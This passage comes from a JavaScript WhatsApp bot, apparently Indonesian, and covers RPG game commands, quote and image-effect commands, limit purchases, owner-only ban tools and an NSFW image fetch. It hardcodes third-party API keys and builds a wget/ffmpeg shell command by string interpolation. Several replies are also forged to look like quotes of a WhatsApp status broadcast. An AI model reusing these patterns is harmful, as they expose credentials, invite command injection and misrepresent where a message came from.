			    var koti = `╔════════════════════\n║╭───────────────────\n║│➫ *PEMBAYARAN BERHASIL*\n║╰───────────────────\n╠════════════════════\n║╭─────────────────\n║│➫ *Wiz* : *Lylia*\n║│➫ *Name* : *@${senderr.split('@')[0]}*\n║│➫ *Traveler* : *${pushname}*\n║│➫ *Nominal* : *${payout1}*\n║│➫ *Harga* : *${koinpotionPerpotion}/potion*\n║│➫ *Sisa Uang* : *${checkATMuser(sender)}*\n║│➫ *Proses Berhasil*\n║│➫ *${createSerial(20)}*\n║╰───────────────────\n╚════════════════════\n`
			sendButImage(from, koti, `${watermark}`, foto, [                      
          {
            buttonId: 'y',
            buttonText: {
              displayText: `🧾DONE`,
            },
            type: 1,
          },
        ]);         
        }
        break;   

				
				case 'potion':            
				if (isBanned) return reply(mess.baned)
   if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(mess.limit)          
     				    checkPotion(sender)
					break
					case 'heal':                     
                    if (isBanned) return reply(mess.baned)
   if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(mess.limit) 
				    checkHeal(sender)
					break
					//GAME NYA NGAB 
                    case 'usepotion':
		            if (isBanned) return reply(mess.baned)
   if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(mess.limit) 
		            let healperpotion = 1
		            let pot = healperpotion * 1
		            if (isPotion(sender)) return reply(`maaf potion kamu belum mencukupi. silahkan kumpulkan dan beli nanti`)
		            potionAdd(sender, pot)
		            addHealUser(sender, 25)
		            await reply(`*「 PEMBAYARAN BERHASIL 」*\n\n*Pengirim* : Lylia\n*penerima* : ${pushname}\n*nominal pembelian* : 1 \n*Harga* : ${healperpotion}/25heal\nProses berhasil dengan nomer pembayaran\n${createSerial(15)}`) 
		            break
                    case 'adventure': 
                    if (isBanned) return reply(mess.baned)
				    ngab = ['Longsor','Letusan Gunung','Tsunami','Gempa Bumi','Meteor','Demon']
				    let sesuatu = ngab[Math.floor(Math.random() * ngab.length)]
				    await setTimeout(() => {
                    reply(`${pushname} Sedang Berpetualang`)
                    }, 1000)		
                    await setTimeout(() => {		    
				    reply(`Tiba Tiba Ada ${sesuatu}`)
				    }, 2000)		
				    await setTimeout(() => {
				     reply(`AWAS!!`)
				    }, 3000)		
			        let dungeon =['Whetstone','Willow Field','Rodeo','Verdant Blufs','Bull Holland','Fallen Tree','Dellnort','Verona Lush','Leafy Hollow','Chilliad Dome','Garcia','Pine Valley','Santa Florals','Guvero East','Cranbarry','Junever','Aldea Malvada','Green Palms','Green Oasis','Fort Carson','Prickel Pine','Pilson Meadow','Boca Roca','Rocksore East','Camel Toe','Hanky Panky','Fern Ridge','Montgomerry','Flint Yankton','Vespucci','fortress city', 'ravines valley', 'horizon valley', 'cyber city', 'end city', 'templar city', 'pochinki', 'peak','Vertical Zone','Sentainel Country','Night City','Flush City','Royals Canyon','Blackburn','Peterborough','Tarnstead','Jarren’s','Outpost','Landow','Nearon','Kincardine','Aysgarth','Veritas','Openshaw','Bredwardine','Berkton','Wolford','Norwich','Kald','Solaris','Kilead','Pitmerden','Acomb','Eldham','Warcester','Lingmell','Kilead','Cromerth','Wingston','Garmsby','Kingcardine','Perthlochry','Frostford','Hillford','Hardersfield','Tarrin','Holmfirth','Caerleon','Elisyum','Ballaeter','Penshaw','Bradford','Wigston','Accreton','Kameeraska','Ferncombe','Kilerth','Erostey','Carran','Jongvale','Larnwick','Queenstown','Whaelrdrake','Baerney','Wingston','Arkney','Strongfair','Lowestoft','Beggar’s Hole','Shepshed','Perthlochry','Ironforge','Tywardreath','Pontheugh','Foolshope','Hull','Dalmerlington','Aucteraden','Woodpine','Millstone','Windermere','Lancaster','Kirkwall','Rotherhithe','Astrakhan','Watford','Ritherhithe','Krosstoen','Pella’s','Wish','Grimsby','Ayrith','Ampleforth','Skystead','Eanverness','Penshaw','Peatsland','Astrakane','Pontybridge','Caershire','Snowbush','Sutton','Northwich','Hogsfeet','Claethorpes','Sudbury','Cherrytown','Blue Field','Orrinshire','Aempleforth','Garrigill','Jedburgh','Eastbourne','Taedmorden','Venzor','Grasmere','Ubbin','Falls','Violl’s Garden','Glanchester','Bailymena','Arkkukari','Skargness','Cardend','Llanybydder','Faversham','Yellowseed','Carlisle','Cirencester','Aramoor','Furness','Kincardine','Rotherham','Emelle','Boroughton','Carran','Ffestiniog','Mansfield','Huthwaite','Marclesfield','Pavv','Squall’s End','Glenarm','Dragontail','Moressley','Hardersfield','Gilramore','Aria','Ecrin','Clare View Point','Blackburn','Oakheart','Doonatel','Broughton','Carlisle','Murlayfield','Nuxvar']
			        let ad = dungeon[Math.floor(Math.random() * dungeon.length)]
				     anu = fs.readFileSync('./database/adventure/dungeon.js');
                    jsonAnu = JSON.parse(anu);
                    randIndex = Math.floor(Math.random() * jsonAnu.length);
                    randKey = jsonAnu[randIndex];
                    hasil = await getBuffer(randKey.result)
				    let adven = Math.ceil(Math.random() * 10000)
                    addLevelingXp(sender, adven)
				    let money = Math.ceil(Math.random() * 20000)
				    addKoinUser(sender, money)
				    let poti = Math.ceil(Math.random() * 5)
				    addPotioUser(sender, poti)
				    arifi.sendMessage(from, hasil, image, { quoted: rojak, caption: `◪ *「 DEATH 」\n\n├─ ❏ *Tempat  ${ad}*\n├─ ❏ *MONEY : Rp.${money}*\n├─ ❏ *EXP : ${adven}Xp*\n└─ ❏ Potion : ${poti}` })
				    await limitAdd(sender)
				    await healAdd(sender)
				    break 
				    case 'storyanime': case 'sanime':{
if (isBanned) return reply(mess.baned)
   if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(mess.limit) 
reply(mess.wait)
get_result = await getBuffer(`https://dapuhy-api.herokuapp.com/api/anime/storyanime?apikey=${dappakey}`)
kodi = `*_CLICK NEXT UNTUK SELANJUTNYA_*`
   sendButVideo(from, kodi, `${watermark}`, get_result, [                      
          {
            buttonId: `${prefix+command}`,
            buttonText: {
              displayText: `NEXT`,
            },
            type: 1,
          },
        ]);         
        }
                    break       
        //arifi.sendMessage(from, kosi, video, {quoted: rojak, mimetype: Mimetype.mp4, filename: 'Wibu:v.mp4' })

case 'quotesyt':
                if (isBanned) return reply(mess.baned)
   if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(mess.limit) 
                reply(mess.wait)
                dapuhy = await getBuffer(`https://dapuhy-api.herokuapp.com/api/randomimage/quotesyt?apikey=${dappakey}`)
                arifi.sendMessage(from, dapuhy, image, {quoted: rojak})
                limitAdd(sender, limit)                
                break    
                       // Random Text //
                case 'quotes':
                  if (isBanned) return reply(mess.baned)
   if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(mess.limit) 
                reply(mess.wait)
                    quotes = await fetchJson(`https://api.lolhuman.xyz/api/random/quotes?apikey=${lolkey}`)
                    quotes = quotes.result
                    author = quotes.by
                    quotes = quotes.quote
                    hehe = `_${quotes}_\n\n*― ${author}*`
                    sendButMessage(from, hehe, `Silahkan Click Next Untuk Melanjutkan Nya`, [
            {              
              buttonId: `${prefix}quotes`,
              buttonText: {
                displayText: `NEXT➯`,
              },
              type: 1,
            },
          ]);        
        break;                    

				case 'addrespon':
			if (plugin.owner && !rojak.key.fromMe) return reply(mess.only.ownerB)
				if (args.length < 1) return reply(`Penggunaan ${prefix}addrespon hai|hai juga`)
				let argz = arg.split('|')
				if (checkCommands(argz[0], commandsDB) === true) return reply(`Udah ada`)
				addCommands(argz[0], argz[1], sender, commandsDB)
				reply(`Sukses menambahkan respon ${argz[0]}`)
				break;
			case 'delrespon':
			if (plugin.owner && !rojak.key.fromMe) return reply(mess.only.ownerB)
				if (args.length < 1) return reply(`Penggunaan ${prefix}delrespon hai`)
				if (!checkCommands(body.slice(11), commandsDB)) return reply(`Ga ada di database`)
                deleteCommands(body.slice(11), commandsDB)
				reply(`Sukses menghapus respon ${body.slice(11)}`)
				break;
                 
                case 'quotesdilan':
                  if (isBanned) return reply(mess.baned)
   if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(mess.limit) 
                reply(mess.wait)
                    quotedilan = await fetchJson(`https://api.lolhuman.xyz/api/quotes/dilan?apikey=${lolkey}`)
                    reply(quotedilan.result)
                    break
       case '!':
       case '#':
       case 'z':
       case '.':
       if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fvn})
       break
                case 'quotesimage':
                  if (isBanned) return reply(mess.baned)
   if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(mess.limit) 
                reply(mess.wait)
                    get_result = await getBuffer(`https://api.lolhuman.xyz/api/random/${command}?apikey=${lolkey}`)                    
                    koto = `*_CLICK NEXT UNTUK SELANJUTNYA_*`
                    sendButImage(from, koto, `${watermark}`, get_result, [                      
          {
            buttonId: `${prefix}${command}`,
            buttonText: {
              displayText: `NEXT`,
            },
            type: 1,
          },
        ]);         
                    break
                    

                case 'faktaunik':
                case 'katabijak':
                case 'pantun':
                case 'bucin':
                  if (isBanned) return reply(mess.baned)
   if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(mess.limit) 
                reply(mess.wait)
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/random/${command}?apikey=${lolkey}`)
                    sendButMessage(from, get_result.result, `Silahkan Click Next Untuk Melanjutkan Nya`, [
            {              
              buttonId: `${prefix}${command}`,
              buttonText: {
                displayText: `NEXT➯`,
              },
              type: 1,
            },
          ]);        
                    break
case 'watak':{
   if (!isRegistered) return arifi.reply(from, global.db.mess.error.noregis, rojak)
   if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(mess.limit) 
					var watak = body.slice(1)
					const wa =['Penyayang','Pemurah','Pemarah','Pemaaf','Penurut','Baik','Baperan','Baik Hati','penyabar','UwU','top deh, pokoknya','Suka Membantu']
					const tak = wa[Math.floor(Math.random() * wa.length)]
					arifi.sendMessage(
					from, 
					'Pertanyaan : *'+watak+'*\n\nJawaban : '+ tak, 
					MessageType.text, { 
					    quoted: rojak,
					    sendEphemeral: true

					    }
			       		)
				       	await limitAdd(sender)
				       	}
				        break;
				        
                case 'randomnama':
                  if (isBanned) return reply(mess.baned)
   if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(mess.limit) 
                reply(mess.wait)
                    anu = await fetchJson(`https://api.lolhuman.xyz/api/random/nama?apikey=${lolkey}`)
                    reply(anu.result)
                    break
                	case 'setprofile':
				case 'setpp':
				arifi.updatePresence(from, Presence.composing)
				if (!isQuotedImage) return reply('Reply imagenya!')
					if (!isOwner && !rojak.key.fromMe) return reply(mess.only.owner)
					enmediau = JSON.parse(JSON.stringify(rojak).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					mediau = await arifi.downloadAndSaveMediaMessage(enmediau)
					await arifi.updateProfilePicture(botNumber, mediau)
					reply('Sukses')
					break
                    
      //------------------< Sticker Cmd >-------------------
      case 'addcmd':
      case 'setcmd':  
      if (!isOwner && !rojak.key.fromMe) return reply(mess.only.owner)
        if (isQuotedSticker) {
          if (!q)
            return reply(`Penggunaan : ${command} cmdnya dan tag stickernya`);
          var kodenya =
            rojak.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage.fileSha256.toString(
              'base64'
            );
          addCmd(kodenya, q);
          fakestatus('Done!');
        } else {
          reply('tag stickenya');
        }
        break;  
        
        case 'limit': case 'ceklimit': case 'balance': case 'glimit':
tiyo = `*${pushname}*\n\nLimit : ${isPremium ? 'Unlimited' : `${getLimit(sender, limitCount, limit)}/${limitCount}`}\nLimit Game : ${cekGLimit(sender, gcount, glimit)}/${gcount}\nBalance : $${getBalance(sender, balance)}\n\nKamu dapat membeli limit dengan ${prefix}buylimit dan ${prefix}buyglimit untuk membeli game limit`
sendButMessage(from, tiyo, `CLICK DIBAWAH UNTUK MEMBELI LIMIT`, [
            {              
              buttonId: `${prefix}buylimit`,
              buttonText: {
                displayText: `💸BUYLIMIT`,
              },
              type: 1,
            },
          ]);                  
        break;            
case 'balance': case 'topbalance':
if(!isGroup)return reply(mess.only.group)
arifi.updatePresence(from, Presence.composing)
let txot = `*── 「 TOP BALANCE 」 ──*\n\n`
let mebn = [];
for (let i of balance){
mebn.push(i.id)
let bl = (i.balance)
txot += `*ID :* @${i.id.split('@')[0]}\n➸ Balance : ${bl}\n\n`
  }
mentions(txot, mebn, true)
break

case 'buylimit':
if (!q)return reply(`Example : ${prefix + command} 10`)
if (isNaN(q)) return reply(`Harus berupa angka`)
let ane = Number(nebal(q) * 100)
if (getBalance(sender, balance) < ane) return reply(`Balance kamu tidak mencukupi untuk pembelian ini`)
kurangBalance(sender, ane, balance)
tiyu = `PEMBELIAN SEBANYAK ${q}`
sendButMessage(from, tiyu, `SILAHKAN CLICK SALAH SATU UNTUK MEMBELI LIMIT`, [
            {              
              buttonId: `${prefix}bylimit ${q}`,
              buttonText: {
                displayText: `🧾LIMIT FITUR`,
              },
              type: 1,
               },
          {
            buttonId: `${prefix}buyglimit ${q}`,
            buttonText: {
              displayText: `🎮LIMIT GAME`,
            },
            type: 1,
              },
          {
            buttonId: `${prefix}limit`,
            buttonText: {
              displayText: `🔖CHECK LIMIT`,
            },
            type: 1,
          },
        ]);               
        break;            
case 'buymlimit':
					if (args.length < 1) return reply(`mau beli berapa? misal 1 atau 2 dst, harga perlimit 500 Contoh ${prefix + command} 3`)
				payout = body.slice(11)
				let koinPerlimit = 500
				let total = koinPerlimit * payout
				if ( checkATMuser(sender) <= total) return reply(`MAAF UANG KAMU BELUM CUKUP, JIKA INGIN MELIHAT UANG KETIK ${prefix}dompet`)
				if ( checkATMuser(sender) >= total ) {
					confirmATM(sender, total)
					bayarLimit(sender, payout)
					await reply(`*PEMBELIAN BERHASIL*\n\n*diterima* : ${pushname}\n*nominal pembelian* : ${payout} \n *harga limit* : ${koinPerlimit}/limit\n *sisa uang mu* : ${checkATMuser(sender)}\n\nproses berhasil dengan nomer pembayaran\n${createSerial(15)}`)
				} 
				break


      case 'delcmd': 
      if (!isOwner && !rojak.key.fromMe) return reply(mess.only.owner)
        if (!isQuotedSticker)
          return reply(`Penggunaan : ${command} tagsticker`);
        var kodenya =
          rojak.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage.fileSha256.toString(
            'base64'
          );
        scommand.splice(getCommandPosition(kodenya), 1);
        fs.writeFileSync('./database/scommand.json', JSON.stringify(scommand));
        fakestatus('Done!');
        break;
      case 'listcmd':
        teksnyee = `\`\`\`「 LIST STICKER CMD 」\`\`\``;
        cemde = [];
        for (let i of scommand) {
          cemde.push(i.id);
          teksnyee += `\n\n➸ *ID :* ${i.id}\n➸ *Cmd* : ${i.chats}`;
        }
        mentions(teksnyee, cemde, true);
        break; 
        case 'ban':
				if (!isOwner && !rojak.key.fromMe) return reply(mess.only.owner)
				bnnd = `${args[0].replace('@', '')}@s.whatsapp.net`
				ban.push(bnnd)
				fs.writeFileSync('./database/banned.json', JSON.stringify(ban))
				reply(`Nomor ${bnnd} telah dibanned!`)
				break  
				case 'unban':
				if (!isOwner && !rojak.key.fromMe) return reply(mess.only.owner)
				dap = `${args[0].replace('@', '')}@s.whatsapp.net`
				unb = ban.indexOf(dap)
				ban.splice(unb, 1)
				fs.writeFileSync('./database/banned.json', JSON.stringify(ban))
				reply(`Nomor ${dap} telah di unban!`)
				break  
				case 'nulis':
                if (isBanned) return reply(mess.baned)
   if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(mess.limit) 
                if (args.length < 1) return reply(`teksnya mana bruh?\ncontoh ${prefix + command} ${pushname}`)
                dpuhy = args.join(' ')
               tiyo = `SILAHKAN PILIH SALAH SATU`
sendButMessage(from, tiyo, `${watermark}`, [
            {              
              buttonId: `${prefix}nuliskanan ${dpuhy}`,
              buttonText: {
                displayText: `KANAN`,
              },
              type: 1,
               },
          {
            buttonId: `${prefix}nuliskiri ${dpuhy}`,
            buttonText: {
              displayText: `KIRI`,
            },
            type: 1,          
          },
        ]);               
        break;                 
        case 'folio':
                if (isBanned) return reply(mess.baned)
   if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(mess.limit) 
                if (args.length < 1) return reply(`teksnya mana bruh?\ncontoh ${prefix + command} ${pushname}`)
                dpuhy = args.join(' ')
               tiyt = `SILAHKAN PILIH SALAH SATU`
sendButMessage(from, tiyt, `${watermark}`, [
            {              
              buttonId: `${prefix}foliokanan ${dpuhy}`,
              buttonText: {
                displayText: `KANAN`,
              },
              type: 1,
               },
          {
            buttonId: `${prefix}foliokiri ${dpuhy}`,
            buttonText: {
              displayText: `KIRI`,
            },
            type: 1,          
          },
        ]);               
        break;                
				

                case 'nuliskanan':
                if (isBanned) return reply(mess.baned)
   if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(mess.limit) 
                if (args.length < 1) return reply(`teksnya mana bruh?\ncontoh ${prefix + command} ${pushname}`)
                reply(mess.wait)
                dpuhy = args.join(' ')
                dapuhy = await getBuffer(`https://dapuhy-api.herokuapp.com/api/maker/nuliskanan?text=${dpuhy}&apikey=${dappakey}`)
                arifi.sendMessage(from, dapuhy, image, {quoted: rojak})
                limitAdd(sender, limit)                
                break    
                case 'nuliskiri':
                if (isBanned) return reply(mess.baned)
   if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(mess.limit) 
                if (args.length < 1) return reply(`teksnya mana bruh?\ncontoh ${prefix + command} ${pushname}`)
                reply(mess.wait)
                dpuhy = args.join(' ')
                dapuhy = await getBuffer(`https://dapuhy-api.herokuapp.com/api/maker/nuliskiri?text=${dpuhy}&apikey=${dappakey}`)
                arifi.sendMessage(from, dapuhy, image, {quoted: rojak})
                limitAdd(sender, limit)                
                break    
                case 'nuliskiri': 
                if (isBanned) return reply(dpa.baned)
                if (isBanned) return reply(mess.baned)
   if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(mess.limit) 
                if (args.length < 1) return reply(`teksnya mana bruh?\ncontoh ${prefix + command} ${pushname}`)
                reply(mess.wait)
                dpuhy = args.join(' ')
                dapuhy = await getBuffer(`https://dapuhy-api.herokuapp.com/api/maker/nuliskiri?text=${dpuhy}&apikey=${dappakey}`)
                arifi.sendMessage(from, dapuhy, image, {quoted: rojak})
                limitAdd(sender, limit)                
                break    
                case 'foliokanan':
                if (isBanned) return reply(mess.baned)
   if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(mess.limit) 
                if (args.length < 1) return reply(`teksnya mana bruh?\ncontoh ${prefix + command} ${pushname}`)
                reply(mess.wait)
                dpuhy = args.join(' ')
                dapuhy = await getBuffer(`https://dapuhy-api.herokuapp.com/api/maker/foliokanan?text=${dpuhy}&apikey=${dappakey}`)
                arifi.sendMessage(from, dapuhy, image, {quoted: rojak})
                limitAdd(sender, limit)                
                break    
                case 'foliokiri':
                if (isBanned) return reply(mess.baned)
   if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(mess.limit) 
                if (args.length < 1) return reply(`teksnya mana bruh?\ncontoh ${prefix + command} ${pushname}`)
                reply(mess.wait)
                dpuhy = args.join(' ')
                dapuhy = await getBuffer(`https://dapuhy-api.herokuapp.com/api/maker/foliokiri?text=${dpuhy}&apikey=${dappakey}`)
                arifi.sendMessage(from, dapuhy, image, {quoted: rojak})
                limitAdd(sender, limit)                
                break    
                  case 'triggerd':
            case 'tg':
                var imgbb = require ('imgbb-uploader')

                if ((isMedia && !rojak.message.videoMessage || isQuotedImage) && args.length == 0) {

                    ger = isQuotedImage ? JSON.parse(JSON.stringify(rojak).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : rojak

                    reply(mess.wait)

                    owgi = await arifi.downloadAndSaveMediaMessage(ger)

                    anu = await imgbb('3395a377ebac7e9f744c3683b44a2a59', owgi)

                    teks = `${anu.display_url}`

                    ranp = getRandom('.gif')

                    rano = getRandom('.webp')

                    anu1 = `https://some-random-api.ml/canvas/triggered?avatar=${teks}`

                    exec(`wget ${anu1} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {

                        fs.unlinkSync(ranp)

                        if (err) return reply(mess.error.stick)

                        nobg = fs.readFileSync(rano)

                        arifi.sendMessage(from, nobg, sticker, { quoted: ftoko })

                        fs.unlinkSync(rano)

                    })



                } else {

                    reply('Gunakan foto!')

                }
                break     
                l
         
                case 'hackereffect':
                if (isBanned) return reply(mess.baned)
   if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(mess.limit) 
	var imgbb = require ('imgbb-uploader')
	if ((isMedia && !rojak.message.videoMessage || isQuotedImage) && args.length == 0) {
	  ted = isQuotedImage ? JSON.parse(JSON.stringify(rojak).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo: rojak
	  reply(mess.wait)
	  owgi = await arifi.downloadAndSaveMediaMessage(ted)
	  tels = body.slice(14)
	  anu = await imgbb('5a0d93e32913ddd1003690128d0a32d5', owgi)
	  hehe = await getBuffer(`https://dapuhy-api.herokuapp.com/api/canvas/hacker?img=${anu.display_url}&apikey=Itsrojako`)
	 arifi.sendMessage(from, hehe, image, {quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: 'status@broadcast' } : {}) }, message: { 'documentMessage': { 'url': 'https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc', 'mimetype': 'image/jpeg', 'title': '*TSUNDERE*', 'fileSha256': '+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=', 'fileLength': '28777', 'height': 1080, 'width': 1079, 'mediaKey': 'vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=', 'fileEncSha256': 'sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=', 'directPath': '/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69', 'mediaKeyTimestamp': '1610993486', 'jpegThumbnail': fs.readFileSync('stik/fake.jpg')} } }, caption: 'Nih Hasilnya Kak...'})
	} else {
	  reply('Jangan tambah kan apapun pada command')
	}
	limitAdd(sender, limit)
	break  
	case 'rip':
	if (isBanned) return reply(mess.baned)
   if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(mess.limit) 
	var imgbb = require ('imgbb-uploader')
	if ((isMedia && !rojak.message.videoMessage || isQuotedImage) && args.length == 0) {
	  ted = isQuotedImage ? JSON.parse(JSON.stringify(rojak).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo: rojak
	  reply(mess.wait)
	  owgi = await arifi.downloadAndSaveMediaMessage(ted)
	  tels = body.slice(5)
	  anu = await imgbb('5a0d93e32913ddd1003690128d0a32d5', owgi)
	  hehe = await getBuffer(`https://janbot-api.herokuapp.com/api/imgedit/petimati?url=${anu.display_url}`)
	 arifi.sendMessage(from, hehe, image, {quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: 'status@broadcast' } : {}) }, message: { 'documentMessage': { 'url': 'https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc', 'mimetype': 'image/jpeg', 'title': '*TSUNDERE*', 'fileSha256': '+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=', 'fileLength': '28777', 'height': 1080, 'width': 1079, 'mediaKey': 'vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=', 'fileEncSha256': 'sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=', 'directPath': '/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69', 'mediaKeyTimestamp': '1610993486', 'jpegThumbnail': fs.readFileSync('stik/fake.jpg')} } }, caption: 'Nih Hasilnya Kak...'})
	} else {
	  reply('Jangan tambah kan apapun pada command')
	}
	limitAdd(sender, limit)
	break  
	case 'glass':
	if (isBanned) return reply(mess.baned)
   if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(mess.limit) 
	var imgbb = require ('imgbb-uploader')
	if ((isMedia && !rojak.message.videoMessage || isQuotedImage) && args.length == 0) {
	  ted = isQuotedImage ? JSON.parse(JSON.stringify(rojak).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo: rojak
	  reply(mess.wait)
	  owgi = await arifi.downloadAndSaveMediaMessage(ted)
	  tels = body.slice(7)
	  anu = await imgbb('5a0d93e32913ddd1003690128d0a32d5', owgi)
	  hehe = await getBuffer(`https://janbot-api.herokuapp.com/api/imgedit/glass?url=${anu.display_url}`)
	 arifi.sendMessage(from, hehe, image, {quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: 'status@broadcast' } : {}) }, message: { 'documentMessage': { 'url': 'https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc', 'mimetype': 'image/jpeg', 'title': '*TSUNDERE*', 'fileSha256': '+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=', 'fileLength': '28777', 'height': 1080, 'width': 1079, 'mediaKey': 'vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=', 'fileEncSha256': 'sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=', 'directPath': '/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69', 'mediaKeyTimestamp': '1610993486', 'jpegThumbnail': fs.readFileSync('stik/fake.jpg')} } }, caption: 'Nih Hasilnya Kak...'})
	} else {
	  reply('Jangan tambah kan apapun pada command')
	}
	limitAdd(sender, limit)
	break  
	case 'wasted':
	if (isBanned) return reply(mess.baned)
   if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(mess.limit) 
	var imgbb = require ('imgbb-uploader')
	if ((isMedia && !rojak.message.videoMessage || isQuotedImage) && args.length == 0) {
	  ted = isQuotedImage ? JSON.parse(JSON.stringify(rojak).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo: rojak
	  reply(mess.wait)
	  owgi = await arifi.downloadAndSaveMediaMessage(ted)
	  tels = body.slice(8)
	  anu = await imgbb('5a0d93e32913ddd1003690128d0a32d5', owgi)
	  hehe = await getBuffer(`https://janbot-api.herokuapp.com/api/imgedit/wasted?url=${anu.display_url}`)
	 arifi.sendMessage(from, hehe, image, {quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: 'status@broadcast' } : {}) }, message: { 'documentMessage': { 'url': 'https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc', 'mimetype': 'image/jpeg', 'title': '*TSUNDERE*', 'fileSha256': '+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=', 'fileLength': '28777', 'height': 1080, 'width': 1079, 'mediaKey': 'vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=', 'fileEncSha256': 'sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=', 'directPath': '/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69', 'mediaKeyTimestamp': '1610993486', 'jpegThumbnail': fs.readFileSync('stik/fake.jpg')} } }, caption: 'Nih Hasilnya Kak...'})
	} else {
	  reply('Jangan tambah kan apapun pada command')
	}
	limitAdd(sender, limit)
	break 
	

                case 'imgurl':                              
                    var imgbb = require ('imgbb-uploader')
                    var encmedia  = isQuotedImage ? JSON.parse(JSON.stringify(rojak).replace('quotedM','m')).message.extendedTextMessage.contextInfo : rojak
                    var media = await  arifi.downloadAndSaveMediaMessage(encmedia)       
                    imgbb('3395a377ebac7e9f744c3683b44a2a59', media)
                   .then(data => {
                    var caps = `*「 _IMAGE TO URL_ 」*\n\n*~>  ID :* ${data.id}\n*~>  MimeType :* ${data.image.mime}\n*~>  Extension :* ${data.image.extension}\n*~>  URL :* ${data.display_url}`
                    ibb = fs.readFileSync(media)
                     arifi.sendMessage(from, ibb, image, { quoted: ftoko, caption: caps })
                })
                .catch(err => {
                    throw err
                })
                limitAdd(sender, limit)
                    break 
      //------------------< Fitur weabo >------------------ 
      case 'hentai2': 
     if (isBanned) return reply(mess.baned)
   if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(mess.limit) 
				if (!isNsfw) return reply(mess.nsfwoff)				
				dapuhy = await getBuffer(`https://api.lolhuman.xyz/api/random/nsfw/hentai?apikey=${lolkey}`)
				arifi.sendMessage(from, dapuhy, image, {quoted: rojak})				
				limitAdd(sender, limit)
				break  
				          case 'pinterest':  
      if (isBanned) return reply(mess.baned)
   if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(mess.limit) 
            if (args.length < 1) return reply(`${prefix}pinterest Nakano Nino`)
              data = await fetchJson(`https://api.lolhuman.xyz/api/pinterest?apikey=${lolkey}&query=${q}`)
              buttons = [{buttonId: `${prefix + command} ${q}`,buttonText:{displayText: `➡️Next`},type:1}]
              fs.writeFileSync(`./${sender}.jpeg`, await getBuffer(data.result))
              imageMsg = ( await arifi.prepareMessage(from, fs.readFileSync(`./${sender}.jpeg`), 'imageMessage', {thumbnail: Buffer.alloc(0)})).message.imageMessage
              buttonsMessage = {footerText:'Jangan Lupa Donasi Ya Kak ☕', imageMessage: imageMsg,
              contentText:`*Hasil Pencarian Dari : ${q}*`,buttons,headerType:4}
              prep = await arifi.prepareMessageFromContent(from,{buttonsMessage},{})
              arifi.relayWAMessage(prep)
